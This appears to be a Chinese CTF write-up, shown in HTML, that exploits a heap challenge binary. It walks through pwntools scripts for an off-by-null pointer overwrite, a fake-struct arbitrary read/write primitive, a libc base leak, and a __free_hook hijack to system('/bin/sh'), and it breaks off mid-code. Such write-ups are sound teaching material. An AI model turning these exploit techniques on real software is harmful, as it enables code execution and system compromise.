p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(desc_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author</span>(<span class="params">author</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(author)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">debug()</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>,<span class="number">0x20</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">change_author(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>init()先将作者名设置为32个A，然后create新建一个book（因为id是1，所以咱们叫他book1），然后再change_author修改作者名，看看内存里会有什么样的变化。</p><p><strong>1.init()执行过后</strong><br><img src="https://img-blog.csdnimg.cn/2020120117002334.png" alt="在这里插入图片描述"><br>可以看到在内存里写入了32个41</p><p><strong>2.create()执行过后</strong><br><img src="https://img-blog.csdnimg.cn/20201201170301276.png" alt="在这里插入图片描述"><br>可以看到在32个A后出现了一个指针，指针指向b00k1的id<br><img src="https://img-blog.csdnimg.cn/20201201170429659.png" alt="在这里插入图片描述"><br><strong>3.change_author()执行过后</strong><br><img src="https://img-blog.csdnimg.cn/20201201213343427.png" alt="在这里插入图片描述"><br>可以发现原来指向book1的ID的指针后两位被覆盖为了00。<br>如何利用这个漏洞？<br>思路：在覆盖为00后的地址位置（如这里的0x56285dc0f300），写一个伪造的book，怎么写，如何利用这个伪造的book我们之后再分析。</p><h2 id="数据结构分析"><a href="#数据结构分析" class="headerlink" title="数据结构分析"></a><em>数据结构分析</em></h2><p>在利用漏洞之前，我们先分析一下这个程序所用到的结构体。<br>在create book对应函数里面可以找到这样一段代码<br><img src="https://img-blog.csdnimg.cn/20201202140253733.png" alt="在这里插入图片描述"><br>这一块就很明显的反映出这个程序所用的结构体的结构。<br>先看这个*((_QWORD *)off_202010 + v2) = v3;<br>这个off_202010在之前用到过类似的地址：<br><img src="https://img-blog.csdnimg.cn/20201202140501120.png"><br>对，就是之前创建作者名的时候。</p><blockquote><p>ps.这里的sub_9F5和之前的sub_B6D是同一个函数，因为我写这篇文章不是一次性写完的，中间关了一次IDA。不过这都不重要。</p></blockquote><p>跳转到IDA看一下<br><img src="https://img-blog.csdnimg.cn/20201202140609749.png" alt="在这里插入图片描述"><br>我们可以看到，作者名的起始地址off_202018在0x202040，而create中调用的这个地址在0x202060，刚好相差了0x20，再回头看一下之前create()函数执行过后的内存图：<br><img src="https://img-blog.csdnimg.cn/20201202141014785.png" alt="在这里插入图片描述"><br>现在我们可以理解，前面两行(0x20)的41(‘A’)之后跟的那个地址，就是book1的起始地址。<br>然后再回到IDA看另外的四行，翻译过来的结构体就大概长这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">void</span> *book_name;</span><br><span class="line"><span class="keyword">void</span> *book_description;</span><br><span class="line"><span class="keyword">int</span> description_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>id对应了unk_202024，随着书的数量增加而自增。<br>*bookname可以通过之前的代码推断：<br><img src="https://img-blog.csdnimg.cn/20201202141522668.png" alt="在这里插入图片描述"><br>*book_description和description_size也是类似：<br><img src="https://img-blog.csdnimg.cn/20201202141637393.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201202141657947.png" alt="在这里插入图片描述"></p><blockquote><p>这边有一点需要注意，在IDA中，v5,ptr,unk_202024的地址都用的是<br>v3+0,v3+1,v3+2，为什么v1的地址用的是v3+6呢？而事实上我们看到：<br><img src="https://img-blog.csdnimg.cn/20201202142459313.png" alt="在这里插入图片描述"><br>这里的v1(description_size)是在v3+3的位置。<br>这是因为QWRD是四字，比DWORD双字大了一倍，因此DWORD的+6就相当于QWORD的+3</p></blockquote><h2 id="漏洞利用：Edit"><a href="#漏洞利用：Edit" class="headerlink" title="漏洞利用：Edit()"></a><em>漏洞利用：Edit()</em></h2><p><img src="https://img-blog.csdnimg.cn/20201202135034999.png" alt="在这里插入图片描述"><br>看到菜单的选项3是Edit a book，转到函数界面看看：<br><img src="https://img-blog.csdnimg.cn/20201202135115976.png" alt="在这里插入图片描述"><br>可以看到这边又调用了读函数sub_9F5，将读取的内容写到book结构体基地址+16（0x10）处的指针所指向的位置。<br>也就是：<img src="https://img-blog.csdnimg.cn/20201202143838146.png" alt="在这里插入图片描述"><br>图中这个地址所指向的地方<br>我们跳转过去看看<br><img src="https://img-blog.csdnimg.cn/20201202144024131.png" alt="在这里插入图片描述"><br>在这里就看到我之前测试所写的’aaaaaaaa’<code>&#39;a&#39;=62</code><br>也就是说如果我们控制了这里的0x000056285dc0f2e0，就可以在任意的地方写任意的东西了。<br>另外在菜单的4选项还有print book detail的选项，也就是说如果我们控制了这个description指针的地址，就可以做到<strong>任意地址读写</strong>。<br>具体怎么实现再往后看。</p><h2 id="0x01-fakebook的构造和利用"><a href="#0x01-fakebook的构造和利用" class="headerlink" title="0x01 fakebook的构造和利用"></a>0x01 fakebook的构造和利用</h2><p>就像历史上国与国之间的侵略一样，想要获得一个内鬼，就得先培养一个内鬼，然后再让这个内鬼得到他们内部的信任（权限）<br>那我们先来构造一个内鬼</p><h3 id="构造fakebook"><a href="#构造fakebook" class="headerlink" title="构造fakebook"></a>构造fakebook</h3><p>这个很简单，只要这样就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">init()</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>,<span class="number">0x20</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"><span class="comment">###############此处为新增代码###############</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">1</span>) + p64(<span class="number">0x114514</span>) + p64(<span class="number">0x114514</span>) + p64(<span class="number">0xffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">###########################################</span></span><br><span class="line">debug()</span><br><span class="line">change_author(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行一下看看是不是这么回事：<br><img src="https://img-blog.csdnimg.cn/20201202145954216.png" alt="在这里插入图片描述"><br>当当！我们的内鬼已经培养完了，这个内鬼可以在0x114514这个地址写0xffffff大小的内容，是不是很猛？<br>但是！别忘记一个很关键的事情，<br><img src="https://img-blog.csdnimg.cn/20201202150113817.png" alt="在这里插入图片描述"><br>程序它不认我这个内鬼啊！只要这里book1的指针还是指向0x56157f41c310，我们往book1的description写东西就还是往0x56157f41c2e0写，那怎么办呢？<br>这时候就想到了之前我们提到的off-by-null漏洞了，我们只要再填写一次作者名（就是前面的一堆4141），就会溢出一个\x00，覆盖掉0x56157f41c310后面的10。<br>乍一看这仿佛是不可控的，只能把后面两个改成00，但是我们的内鬼在0x56157f41c2e0，要怎么把book1的指针指向我们的内鬼呢？<br>其实name，description，book1他们三个是轮流划分区域的。<br><img src="https://img-blog.csdnimg.cn/20201202154841219.png" alt="在这里插入图片描述"><br>我们这里用刚好一本书的description大小0x20（chunk大小是0x30），那么如果book1的地址是以0xXXXXXX30结尾，那么用\x00覆盖以后，就变成0xXXXXXX00，由于book1的chunk刚好紧接着description的chunk，所以此时的0xXXXXXX00就刚好是description的地址。<br>那现在问题就在于如何把book1的结尾变成0x30？<br>只要不断扩大name的size直到book1的地址变为0x30结尾即可。</p><h3 id="使fakebook取代book1"><a href="#使fakebook取代book1" class="headerlink" title="使fakebook取代book1"></a>使fakebook取代book1</h3><p><img src="https://img-blog.csdnimg.cn/20201202155450295.png" alt="在这里插入图片描述"><br>先看一下当前name是0x20，description也是0x20的时候，堆的结构是这样的：<br><img src="https://img-blog.csdnimg.cn/20201202155936216.png" alt="在这里插入图片描述"><br>可以看到如果要让book1基地址变成0x30的话 需要：<br><img src="https://img-blog.csdnimg.cn/202012021601410.png" alt="在这里插入图片描述"><br>往下挤0x20<br>所以咱们把name加0x20，再试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size, name, desc_size, desc</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(desc_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author</span>(<span class="params">author</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(author)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">book_id, desc</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">create(<span class="number">0x20</span> + <span class="number">0x20</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>,<span class="number">0x20</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">1</span>) + p64(<span class="number">0x114514</span>) + p64(<span class="number">0x114514</span>) + p64(<span class="number">0xffffff</span>))</span><br><span class="line">debug()</span><br><span class="line">change_author(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>现在脚本长这样，看看啥效果<br><img src="https://img-blog.csdnimg.cn/20201202160834428.png" alt="在这里插入图片描述"><br>很好，book1已经如我们所愿变成30结尾了<br>执行到下一个debug()<br><img src="https://img-blog.csdnimg.cn/20201202160944927.png" alt="在这里插入图片描述"><br>到这一步，内鬼已经写好。继续执行<br><img src="https://img-blog.csdnimg.cn/20201202161038931.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201202161126931.png" alt="在这里插入图片描述"><br>到此，我们已经成功完成了扶植内鬼，和任命内鬼的全过程。<br>测试一下：<br><img src="https://img-blog.csdnimg.cn/20201202161248347.png" alt="在这里插入图片描述"><br>我尝试输出了一下书的细节，程序直接崩溃了，如我所料。<br>如果没有任命成功，它会照常输出：<br><img src="https://img-blog.csdnimg.cn/20201202161401281.png" alt="在这里插入图片描述"><br>之所以这里会崩溃，是因为程序找不到0x114514这个地址。<br>也就证明我们的内鬼计划非常成功。</p><h2 id="0x02-获取libc基地址，执行shell"><a href="#0x02-获取libc基地址，执行shell" class="headerlink" title="0x02 获取libc基地址，执行shell"></a>0x02 获取libc基地址，执行shell</h2><h3 id="获取libc基地址"><a href="#获取libc基地址" class="headerlink" title="获取libc基地址"></a>获取libc基地址</h3><blockquote><p>当程序需要分配一块较小的空间时，malloc会默认使用brk方式分配chunk，但是如果需要分配的空间很大的话，会使用mmap方式分配。而使用mmap方式分配的chunk有个特点，就是chunk地址与libc基地址之间的<strong>偏移量是固定的（即使开了PIE:libc地址随机）</strong></p><p>这就给我们提供了一个很好的获取libc的方式。<br>地址获取思路：</p></blockquote><ol><li>将作者名填满32字节，由于print输出到\x00停止的特性，输出作者名时尾部会输出book1的地址（如上图的Author尾部的不可见字符）；</li><li>通过book1地址计算出book2的description地址（也可以是NAME地址）；</li><li>将fakebook的description指针所<strong>指向的地址</strong>修改为book2的description<strong>所在的内存地址</strong>（不是指向的地址）；</li><li>通过菜单选项Print book detail泄露book2的description所指向的地址；</li><li>在本地调试，使用vmmap得到book2地址与libc基地址偏移量；</li><li>通过book2的description地址算出libc基地址。<br>下面开始实践<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size, name, desc_size, desc</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(desc_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">book_id</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">book_id, desc</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author</span>(<span class="params">author</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(author)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">book1_name = <span class="number">0x40</span></span><br><span class="line">book1_des = <span class="number">0x20</span></span><br><span class="line">create(book1_name, <span class="string">&#x27;a&#x27;</span>, book1_des, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ID: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">book1_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;book1_addr:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">1</span>)+p64(book1_addr+<span class="number">0x38</span>)+p64(book1_addr+<span class="number">0x38</span>)+p64(<span class="number">0xffff</span>))</span><br><span class="line">change_author(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ID: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">book2_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;book2_addr:&quot;</span>+<span class="built_in">hex</span>(book2_addr))</span><br><span class="line">debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>先看看book2的地址是多少：<br><img src="https://img-blog.csdnimg.cn/20201202183030997.png" alt="在这里插入图片描述"><br>可以看到这边跑出了book2的地址<br>然后vmmap看一下libc基地址是多少<br><img src="https://img-blog.csdnimg.cn/20201202183112135.png" alt="在这里插入图片描述"><br>这里libc-2.31.so就是libc了，第一行的起始地址就是libc的基地址。<br>所以它的偏移量就是：0x7f83dba36000 - 0x7f83dba14010<br>所以libc基地址 = book2_addr + (0x7f83dba36000 - 0x7f83dba14010)<br>修改后的脚本（自定义函数部分略过了）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">init()</span><br><span class="line">book1_name = <span class="number">0x40</span></span><br><span class="line">book1_des = <span class="number">0x20</span></span><br><span class="line">create(book1_name, <span class="string">&#x27;a&#x27;</span>, book1_des, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ID: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">book1_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;book1_addr:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">1</span>)+p64(book1_addr+<span class="number">0x38</span>)+p64(book1_addr+<span class="number">0x38</span>)+p64(<span class="number">0xffff</span>))</span><br><span class="line">change_author(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ID: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">book2_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;book2_addr:&quot;</span>+<span class="built_in">hex</span>(book2_addr))</span><br><span class="line"><span class="comment">###############新加入内容###################</span></span><br><span class="line">libc_base = book2_addr + (<span class="number">0x7f83dba36000</span> - <span class="number">0x7f83dba14010</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>跑跑看效果如何：<br><img src="https://img-blog.csdnimg.cn/20201202183448948.png" alt="在这里插入图片描述"><br>可以看到libc_base和vmmap的结果一模一样。<br>到此libc基地址获取成功。<h3 id="执行shell"><a href="#执行shell" class="headerlink" title="执行shell"></a>执行shell</h3>在堆中，我们常用__free_hook挟持执行流。<br>先来看看__free_hook是干嘛的：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __libc_free(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">    mstate    ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">    <span class="comment">// 判断是否有钩子函数 __free_hook</span></span><br><span class="line">    <span class="keyword">void</span> (*hook)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__free_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//略……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>简单一句话概括：当调用free函数时，会检测__free_hook函数是否为空，如果不是，则先执行__free_hook。<br>研究__free_hook的内部太麻烦了，直接看__free_hook的性质：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">void</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="keyword">void</span> *__ptr,<span class="keyword">const</span> <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *str = <span class="built_in">malloc</span>(<span class="number">160</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(str,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;__free_hook: 0x%016X\n&quot;</span>,__free_hook);</span><br><span class="line"><span class="comment">// 劫持__free_hook</span></span><br><span class="line">__free_hook = system;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>执行结果<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ex@ubuntu:~/test$ gcc -o demo -g demo.c </span><br><span class="line">demo.c: In function ‘main’:</span><br><span class="line">demo.c:<span class="number">12</span>:<span 